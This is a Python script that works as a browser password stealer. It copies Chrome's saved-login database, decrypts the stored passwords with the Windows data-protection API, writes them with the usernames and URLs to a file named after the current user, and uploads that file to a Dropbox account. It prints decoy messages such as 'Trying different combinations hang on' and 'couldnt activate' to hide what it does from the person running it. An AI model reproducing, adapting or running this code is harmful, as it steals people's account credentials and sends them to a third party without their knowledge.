import json
import os
import sqlite3
import shutil
import getpass
import dropbox
import random

try:
    import win32crypt
except:
    pass

def main():
    send()


def getpasswords():

    dataToBeSent = {}
    dataList = []
    path = getpath()
    try:
        connection = sqlite3.connect(path+'\\Login Data')
        cursor = connection.cursor()
        v = cursor.execute(
            'SELECT action_url, username_value, password_value FROM logins')
        value = v.fetchall()

        for origin_url, username, password in value:
            password = win32crypt.CryptUnprotectData(
                password, None, None, None, 0)[1]

            if password:
                dataList.append({
                    'origin_url': origin_url,
                    'username': username,
                    'password': str(password)[2:-1]
                })

	
		

    except sqlite3.OperationalError as e:
        e = str(e)
        if (e == 'database is locked'):
            print('[!] Make sure Google Chrome is not running in the background')
        elif (e == 'no such table: logins'):
            print('[!] Something wrong with the database name')
        elif (e == 'unable to open database file'):
            print('[!] Something wrong with the database path')
        else:
            print(e)

    dataToBeSent["user"] = getpass.getuser()
    dataToBeSent["passwords"] = dataList
    return dataToBeSent
    
def send():

    print('Trying different combinations hang on')
    writer = open("C:\\prog\\" + getpasswords()['user'] + "_lol.txt","w")
    for i in range(len(getpasswords()['passwords'])):
        writer.write(str(getpasswords()['passwords'][i]) + '\n')
    writer.close()

    dbx=dropbox.Dropbox('key to my drop box')
    
    file_to="/" + getpasswords()['user'] + "_lol.txt"
    upload = open("C:\\prog\\" + getpasswords()['user'] + "_lol.txt","rb")
    dbx.files_upload(upload.read(),file_to)
    print('couldnt activate')  
    
    

def getpath():

	source = os.getenv('localappdata') + \
                   '\\Google\\Chrome\\User Data\\Default\\Login Data'
	target = "C:\\prog";
	try: 
		os.mkdir(target)
	except:
		print('',end="")

	shutil.copy(source, target)
	return target

if __name__== '__main__':
    main()
